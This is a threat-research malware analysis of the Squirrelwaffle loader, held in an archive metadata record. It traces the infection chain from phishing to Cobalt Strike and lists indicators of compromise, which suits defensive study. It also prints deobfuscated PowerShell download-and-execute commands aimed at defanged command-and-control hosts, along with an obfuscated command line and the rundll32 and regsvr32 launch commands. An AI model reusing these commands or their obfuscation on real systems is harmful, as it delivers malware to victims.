{
    "id": "342354c6-ca7a-425a-9250-abb8a62abd1f",
    "created_at": "2023-01-12T15:09:45.597044Z",
    "updated_at": "2025-03-27T02:13:29.114824Z",
    "deleted_at": null,
    "sha1_hash": "3b941dfcdffd84f67ab527cfe3fae5ea19b2931c",
    "title": "2021-09-27 - A Virtual Baffle to Battle Squirrelwaffle",
    "authors": "",
    "file_creation_date": "2022-05-28T15:36:49Z",
    "file_modification_date": "2022-05-28T15:36:49Z",
    "file_size": 2126461,
    "plain_text": "# A Virtual Baffle to Battle SquirrelWaffle\n\n**cynet.com/understanding-squirrelwaffle/**\n\n## A Virtual Baffle to Battle Squirrelwaffle\n\n_By: Max Malyutin – Orion Threat Research Team Leader_\n\nWhile tracking malicious spam campaigns at the beginning of September 2021, we discovered a new villain that joined known\nmajor actors including Trickbot, Bazarloader, Ursnif, Dridix, and IcedID in the email-based malware landscape.\n\nEmail-based campaigns are used to deliver and distribute large-scale phishing malspam and deploy different types of malwares.\nThese malicious emails often contain a .ZIP attachment, Microsoft Office document, or a URL link. The weaponized documents\nare responsible for downloading and executing next-stage malware payloads.\n\nThe new kid on the block’s name is Squirrelwaffle, and it was first seen in the wild at the start of September 2021. Squirrelwaffle\nMalDoc samples are tagged by researchers as “TR”, which stands for the malspam distribution infrastructure, a tag that indicates\na particular malspam distribution affiliate.\n\nWe started seeing samples uploaded into open malware databases (such as bazzar.abuse):\n\nWhen inspecting SquirrelWaffle on VirusTotal, we noticed there are additional samples, as can be seen here:\n\n\n-----\n\n**Squirrelwaffle infection chain overview:**\n\nSquirrelwaffle compromises victims via a malspam campaign. Currently, Squirrelwaffle emails deliver a malicious URL link which\nleads to a ZIP file as part of the email content.\n\nThe victim downloads a ZIP file that contains a weaponized Microsoft Office document. The malicious document contains macro\ncode and a fake template that lures the victim to click on Enable Content. After the macros are executed, the malicious\ndocument acts as Dropper. It drops a VBS file stored inside the MalDoc to the disk and launches it via cscript command.\n\nNext, the VBS script downloads five DLL modules from five different URLS via PowerShell command and invokes these modules\nthrough a rundll32 command.\n\n.Currently, we know that the DLL modules enumerate the compromised host and download the next-stage payload from a\nCommand-and-Control (C2) Server. The downloaded file has a TXT extension. The TXT file is a portable executable file (EXE),\nwhich in fact is a Cobalt Strike beacon.\n\nMalware-Traffic-Analysis shared Squirrelwaffle to Cobalt Strike indicators and artifacts:\n\n[https://www.malware-traffic-analysis.net/2021/09/17/index.html](https://www.malware-traffic-analysis.net/2021/09/17/index.html)\n\nInfection chain of Word Squirrelwaffle releases (14 September – ):\n\n\n-----\n\n1. The user receives a phishing email with a malicious URL link to a ZIP file which stores a Microsoft Office weaponized\n\ndocument.\n2. The user opens the malicious weaponized Word document and is lured into clicking on “Enable content” (macros).\n3. The malicious VBA macro is executed and dropd the VBS (visual basic script) file to the ProgramData directory.\n4. The malicious VBA macro executes the VBS file via cscript.\n5. The VBS script executes PowerShell and CMD (Rundll32 executes via the CMD) processes.\n6. The PowerShell command downloads the Squirrelwaffle modules (DLLs).\n7. The rundll32 executes the Squirrelwaffle modules with ldr function.\n8. Enumeration actions are performed on the compromised host.\n9. Finally, a Cobalt Strike beacon is dropped and launched.\n\n**Update 20/09/2021:**\n\nWe have observed another Squirrelwaffle infection. In this new variant, threat actors use malicious Excel documents instead of\nWord documents. The malicious Excel documents contain macro v4 (XLM) code instead of VBA code (Word documents).\n\nFurthermore, they changed the execution and the download methods.\n\nInfection chain of Word Squirrelwaffle releases (20 September – ):\n\n1. The user opens the malicious weaponized Excel document and is lured into clicking on “Enable content” (macros v4).\n2. The malicious macros v4 is executed and downloaded from a C2 server masquerading as DLL payloads.\n3. The malicious macros v4 execute masqueraded DLL payloads via regsvr32 command line.\n4. The regsvr32 executes the Squirrelwaffle modules.\n\n**MITRE** **Attack-Navigator:**\n\n\n-----\n\n**Squirrelwaffle infection chain analysis:**\n\nThe infection chain starts with a phishing email vector. [Phishing technique T1566 has two sub-techniques: Spearphishing](https://attack.mitre.org/techniques/T1566)\nAttachment T1566.001 and Spearphishing Link T1566.002.\n\nSquirrelwaffle currently uses the Spearphishing Link technique by sending malicious emails with a URL to a ZIP file that contains\nthe malicious Word document.\n\n[urlhaus.abuse.ch tag: SQUIRRELWAFFLE](https://urlhaus.abuse.ch/browse/tag/SQUIRRELWAFFLE/)\n\n[Threat actors’ motivation is to lure the victim to interact with the phishing email and download the ZIP file.](https://attack.mitre.org/techniques/T1566)\n\n\n-----\n\nThe next step of the infection is based on the user’s interaction with the phishing email. This step is related to User Execution\n[technique T1204 which is part of the Execution TA0002 tactic.](https://attack.mitre.org/techniques/T1204)\n\n[This technique has two sub-techniques: Malicious Link](https://attack.mitre.org/techniques/T1204/001) [T1204.001 and](https://attack.mitre.org/techniques/T1204) [Malicious File](https://attack.mitre.org/techniques/T1204/002) [T1204.002.](https://attack.mitre.org/techniques/T1204)\n\nThe user downloads the malicious ZIP file by using the URL link in the phishing email. The ZIP file contains a Microsoft Office\nWord document.\n\n**MalDoc pattern name: diagram-[0-9]{2,}.doc**\n**Examples:**\n\n[diagram-864.doc](https://www.virustotal.com/gui/file/ce31d139e6ea2591a8a15fcf37232f97c799e9c5d1410ef86b54a444a7d24d0f)\n\n[diagram-258.doc](https://www.virustotal.com/gui/file/b7fa56ddedd0fff91af460edc504574ddc7b1df97d33d635d854e71a7be34060)\n\n[diagram-268.doc](https://www.virustotal.com/gui/file/783e3b86c24af82773b0dae3e738c46a79de252b1bcc5945b65da0d040ee6e9d)\n\n[diagram-864.doc](https://www.virustotal.com/gui/file/ce31d139e6ea2591a8a15fcf37232f97c799e9c5d1410ef86b54a444a7d24d0f)\n\n[diagram-268.doc](https://www.virustotal.com/gui/file/783e3b86c24af82773b0dae3e738c46a79de252b1bcc5945b65da0d040ee6e9d)\n\n[diagram-107.doc](https://www.virustotal.com/gui/file/05930a8bfc7e97d1f7d460352842b2f94a7b552852d1abb9dc7c8ae9698a3934)\n\n[diagram-955.doc](https://www.virustotal.com/gui/file/9bba679ea952513d3d6a8d5d827f56ce31b2e832940d45428c97d50e06b40e26)\n\nTo lure the victim to click on “Enable Content”, threat actors use a fake DocuSign template message.\n\nBelow, you can see an example of the Squirrelwaffle MalDoc requesting the user to click on the security warning button “Enable\nContent”. This allows the malicious document to execute code stored as a macro.\n\n\n-----\n\nOnce macros are enabled, the VBA executes (Command and Scripting Interpreter: Visual Basic: T1059.005) and executes the\nAutoOpen function.\n\nThe AutoOpen macro runs automatically after opening the document and selecting “Enable Content”.\n\nAutoOpen function content leads us to bxh.eFile macro:\n\n\n-----\n\nThe bxh function contains obfuscated VBA code which decoded via StrReverse “Returns a string in which the character order of\na specified string is reversed.”\n\nThe artifact extracted from the bxh function:\n\n**Path: C:\\ProgramData**\n**File Name: pin.vbs**\n\n**Execution command: cmd /k cscript .exe C:\\ProgramData\\pin.vbs**\n\nUsing the OLEVBA tool, we have found several interesting artifacts:\n\n\n-----\n\nThe threat actors use a different technique to hide malicious code/strings such as URLs, IPs, commands, or even shellcode\ninside the malicious document.\n\n\n-----\n\nWe kept digging inside the MalDoc file and found a Form (t2) containing malicious VBS code.\n\nThe obfuscated VBS code is dropped to C:\\ProgramData directory:\n\nThe VBS file is written to the disk via the MalDoc file:\n\n\n-----\n\nThe next step that in the attack happens when macros are enabled. This executes a cmd command that spawns a cscript.exe\nprocess.\n\nExecution command: cmd /k cscript .exe C:\\ProgramData\\pin.vbs\n\nThe cscript process executes the pin.vbs file:\n\nWe have analyzed the VBS code and de-obfuscated it:\n\n\n-----\n\nLL1\\2\\3\\4\\5 (line 6-9, 11-14, 16-19, 21-24 and 26-29) stored PowerShell commands (de-obfuscated):\n\nIEX “(New-Object Net.WebClient).DownloadFile(‘hxxps://priyacareers[.]com/u9hDQN9Yy7g/pt.html’,’C:\\ProgramData\\www1.dll’)”|\nIEX\nIEX (New-Object\nNet.WebClient).DownloadFile(‘hxxps://perfectdemos[.]com/Gv1iNAuMKZ/pt.html’,’C:\\ProgramData\\www2.dll’)|IEX\n\nIEX (New-Object Net.WebClient).DownloadFile(‘hxxps://bussinessz[.]ml/ze8pCNTIkrIS/pt.html’,’C:\\ProgramData\\www3.dll’)|IEX\n\nIEX (New-Object Net.WebClient).DownloadFile(‘hxxps://cablingpoint[.]com/ByH5NDoE3kQA/pt.html’,’C:\\ProgramData\\www4.dll’)\n\nIEX (New-Object\nNet.WebClient).DownloadFile(‘https://bonus.corporatebusinessmachines.co.in/1Y0qVNce/pt.html’,’C:\\ProgramData\\www5.dll)|IEX\n\nLines 34-38 execute a PowerShell instance with each command above (five PS instances in total).\n\nEach PowerShell command uses WebClient Class and DownloadFile method which allows the PowerShell command to\ndownload a DLL file and drop the file to the C:\\ProgramData directory.\n\nOne of the PowerShell instances command-line:\n\n“C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” $Nano=’JOOEX’.replace(‘JOO’,’I’);sal OY\n$Nano;$aa='(New-Ob’; $qq=’ject Ne’; $ww=’t.WebCli’; $ee=’ent).Downl’; $rr=’oadFile’;\n$bb='(”hxxps://priyacareers[.]com/u9hDQN9Yy7g/pt.html”,”C:\\ProgramData\\www1.dll”)’;$FOOX =\n($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ”); OY $FOOX|OY;\n\nBy sniffing the network packets of the PowerShell instances, we have found five IP addresses related to the five URLs observed\nin the VBS script:\n\n\n-----\n\n108[.]167[.]172[.]125\n192[.]185[.]52[.]124\n\n204[.]11[.]58[.]87\n\n162[.]241[.]85[.]65\n\nIn line 39, threat actors use a Sleep function. The function performs a sleep action for 15 seconds to wait with the next step of\nthe execution to allow a full download of all the DLL payloads:\n\nWScript.Sleep(15000)\n\nAfter the Sleep action, the VBS script executes cmd.exe processes that swap a rundll32.exe which runs the following command:\n\ncmd /c rundll32.exe C:\\ProgramData\\www1.dll,ldr\ncmd /c rundll32.exe C:\\ProgramData\\www2.dll,ldr\n\ncmd /c rundll32.exe C:\\ProgramData\\www3.dll,ldr\n\ncmd /c rundll32.exe C:\\ProgramData\\www4.dll,ldr\n\ncmd /c rundll32.exe C:\\ProgramData\\www5.dll,ldr\n\nThe CMD command executes five times a rundll32 process to load the downloaded DLLs with the ldr function, the Squirrelwaffle\nDLL payloads named LdrLoader due to the export function.\n\n\n-----\n\nThe cscript script (pin.vbs) executes CMD and PowerShell processes:\n\nFull process tree execution flow:\n\nThe downloaded DLL modules (LdrLoader) are all the same file. Threat actors have five URLs, and each stores the DLL module.\nWe believe that this is a backup method in this case if one of the URLs is not responding.\n\n\n-----\n\n**Update 20/09/2021:**\n\nWe have detected a new Squirrelwaffle sample which this time have been Excel malicious documents.\n\nThe Excel documents also have the unique pattern name diagram_[RandomChar0-9].xls\n\nThe new Excel documents use a new fake template to lure the victim to click on the “Enable Content” security button:\n\nThe threat actors use several defensive evasion techniques to bypass security application, AVs, and EDRs. These techniques\nmake researchers and security analysts’ life harder.\n\nHidden Sheets\nWhite color font for the macros\nObfuscation and scrambling of the macros in deferent sheets\n\n\n-----\n\nHidden Sheets\n\nWhite macro font color\n\n\n-----\n\nObfuscation and scrambling of the macros in deferent sheets\n\nThe macro type is different in the Word documents. Threat actors use VBA code in, while in Excel the macro type is macro v4\n(XLM).\n\nmacro v4 (XLM), example:\n\nIn both Excel and Word documents, threat actors use the “Auto Open” function to execute the macros.\n\n\n-----\n\nAfter extracting some artifacts, we have found the following:\n\n**Win API:**\nKernel32 CreateDirectoryA\n\nUrlmon URLDownloadToFileA\n\nShell32 ShellExecuteA\n\n**C2 URL:**\n\nhxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec[.]html\n\nhxxps://orquideavallenata[.]com/4jmDb0s9sg/sec[.]html\n\nhxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec[.]html\n\n**File full path and name:**\nC:\\Datop\\test.test\n\nC:\\Datop\\test1.test\n\nC:\\Datop\\test2.test\n\n**Execution command:**\n\nregsvr32 C:\\Datop\\test*.test\n\n\n-----\n\nThreat actors change the download and the execution methods.\n\nFor the download, they use the urlmon and URLDowenloadToFileA Win API functions and for the execution, they use Shell32\nShellExecuteA.\n\nIn this scenario, we have detected three DLL payloads instead of five (Word document flow). DLL payloads are executed by\nabusing the legitimate Microsoft file (LOLbin – “Living off the land”) Regsvr32.\n\nNetwork connection to the C2 server that stores the DLL payloads performed by the Excel document:\n\n108[.]167[.]165[.]249\n95[.]101[.].89[.]74\n\nFull execution flow:\n\n**Indicators of compromise**\n\n\n-----\n\n**MalDoc** **ce31d139e6ea2591a8a15fcf37232f97c799e9c5d1410ef86b54a444a7d24d0f**\n**77c8d399c3cdbb22502432f6ab49a8e56a2a8e4bf9bd02b37797a0ae5962b7d6**\n\n**aaea40485a04b071bd65fc732e70630b314cdadf4f03ba9b7a0030ccf63b1115**\n\n**637af43b3f656ffa8839ab8f23ff2aad7910cc4bd9ed0551d337a02341864e05**\n\n**079a22b70109d00f571ea22079cde3baf9ebe6a3afd93347e09c38c7fccf38dc**\n\n**a56c6b3d58c66042effa180738197415d840443ba839bb7f45042bdb9e51c04f**\n\n**b7fa56ddedd0fff91af460edc504574ddc7b1df97d33d635d854e71a7be34060**\n\n**0e52e26aff6f4cf678515e7c1a491603085e717458cfc12d2b95d46c98eda7ba**\n\n**783e3b86c24af82773b0dae3e738c46a79de252b1bcc5945b65da0d040ee6e9d**\n\n**65f594b4cb31e25f711dd954700bab6d2ac507bd7aab184cc500812b08f8ee03**\n\n**3f453d0703fa81709d25c6ade25215066f38abceec9699b7b49fb9b4171bbb50**\n\n**182a11ae9b66c9abcd9fd9dbd7a0176a5895f354443e31ab3258182ca62d3a47**\n\n**5401103614610b1e109c674b2f90732e0a056be81dbdd8886324aa2d41f0cf2a**\n\n**fc42fbe6525ef4b976bca50eb1c4be6c1696e180c55fbeb5f1c9ce5d32957c88**\n\n**3f453d0703fa81709d25c6ade25215066f38abceec9699b7b49fb9b4171bbb50**\n\n**182a11ae9b66c9abcd9fd9dbd7a0176a5895f354443e31ab3258182ca62d3a47**\n\n**MalDoc C2 Servers** **ghapan[.]com**\n**yoowi[.]net**\n\n**gruasingenieria[.]pe**\n\n**chaturanga[.]groopy[.]com**\n\n**lotolands[.]com**\n\n**bonus[.]corporatebusinessmachines[.]co[.]in**\n\n**bussiness-z[.]ml**\n\n**perfectdemos[.]com**\n\n**cablingpoint[.]com**\n\n**priyacareers[.]com**\n\n**DLL loader payloads** ad8cb4504a5af45ffa91699b017ffa0bc9808e1b170027ab54fe31661279b9b6\n813a9b03c6c1caec4eca8a867dcfbda7860bca6a5d481acb4c131c1a868d4b48\n\n0d66e879f6e7bfa3ab9eb864094912ffd59c14792ed1d2e087e465e8098150fb\n\n671f477c3039786c5f3553760377be03b91bfb66f31ba9370ed2193192cf5b4e\n\n85d0b72fe822fd6c22827b4da1917d2c1f2d9faa838e003e78e533384ea80939\n\n\n-----\n\n**DLL loader C2 Server** jhehosting[.]com\nhrms[.]prodigygroupindia[.]com\n\nbartek-lenart[.]pl\n\ncentralfloridaasphalt[.]com\n\namjsys[.]com\n\nmercyfoundationcio[.]org\n\nnovamarketing[.]com[.]pk\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-27 - A Virtual Baffle to Battle Squirrelwaffle.pdf"
    ],
    "report_names": [
        "2021-09-27 - A Virtual Baffle to Battle Squirrelwaffle.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536185,
    "ts_updated_at": 1743041609,
    "ts_creation_date": 1653752209,
    "ts_modification_date": 1653752209,
    "files": {
        "pdf": "https://archive.orkl.eu/3b941dfcdffd84f67ab527cfe3fae5ea19b2931c.pdf",
        "text": "https://archive.orkl.eu/3b941dfcdffd84f67ab527cfe3fae5ea19b2931c.txt",
        "img": "https://archive.orkl.eu/3b941dfcdffd84f67ab527cfe3fae5ea19b2931c.jpg"
    }
}